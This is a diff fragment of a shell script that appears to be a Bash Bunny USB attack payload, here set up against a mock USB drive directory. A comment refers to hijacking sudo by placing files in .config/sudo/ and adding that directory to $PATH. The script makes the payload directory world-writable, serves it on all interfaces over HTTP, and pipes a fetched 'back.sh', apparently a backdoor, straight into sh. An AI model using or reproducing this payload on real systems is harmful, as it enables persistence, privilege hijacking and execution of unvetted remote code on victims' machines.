@@ -11,10 +11,6 @@
 # inside .config/sudo/ and sourcing the dir
 # in the $PATH.
 #
-# White            |  Ready
-# Ammber blinking  |  Waiting for server
-# Blue blinking    |  Attacking
-# Green            |  Finished
 
 # Create fake Bash Bunny USB drive directory
 MOCK_BASH_BUNNY_USB_DIR=$HOME/bash_bunny
@@ -26,9 +22,9 @@ mkdir -p $MOCK_BASH_BUNNY_USB_DIR $PAYLOAD_DIR $LOOT_DIR
 chmod 777 $PAYLOAD_DIR
 
 # Create http server to host payloads
-python3 -m http.server 8080 --directory $PAYLOAD_DIR --bind 0.0.0.0 &
+python3 -m http.server 8081 --directory $PAYLOAD_DIR --bind 0.0.0.0 &
 
 # wait until port is listening
-while ! nc -z localhost 8080; do sleep 0.2; done
+while ! nc -z localhost 8081; do sleep 0.2; done
 
-curl --noproxy '*' "http://localhost:8080/back.sh" | sh
+curl --noproxy '*' "http://localhost:8081/back.sh" | sh
